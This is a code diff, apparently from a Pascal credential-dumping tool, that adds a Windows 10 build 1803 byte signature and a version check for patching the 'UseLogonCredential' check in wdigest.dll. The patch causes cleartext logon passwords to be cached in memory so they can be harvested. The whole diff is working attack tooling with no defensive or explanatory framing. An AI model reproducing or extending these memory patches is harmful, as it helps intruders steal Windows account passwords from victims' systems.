@@ -873,7 +873,9 @@ const
   //or we could maintain a table of offsets per windows versions...
   PTRN_WIN81_UseLogonCredential:array [0..14] of byte=       ($F7,$46,$50,$00,$08,$00,$00,$0F,$85,$0C,$52,$00,$00,$39,$1D);
   PTRN_WIN10_1703_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$11,$3B,$00,$00,$39,$1D);
+  PTRN_WIN10_1803_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$EE,$6C,$00,$00,$39,$1D);
   PTRN_WIN10_1903_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$E2,$71,$00,$00,$39,$1D);
+
 var
   module:string='wdigest.dll';
   hprocess:thandle;
@@ -900,6 +902,12 @@ result:=false;
         begin
         setlength(pattern,sizeof(PTRN_WIN10_1703_UseLogonCredential));
         copymemory(@pattern[0],@PTRN_WIN10_1703_UseLogonCredential[0],sizeof(PTRN_WIN10_1703_UseLogonCredential));
+        patch_pos:=4;
+        end;
+     if pos('-1803',winver)>0 then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN10_1803_UseLogonCredential));
+        copymemory(@pattern[0],@PTRN_WIN10_1803_UseLogonCredential[0],sizeof(PTRN_WIN10_1803_UseLogonCredential));
         patch_pos:=4;
         end;
      if pos('-1903',winver)>0 then
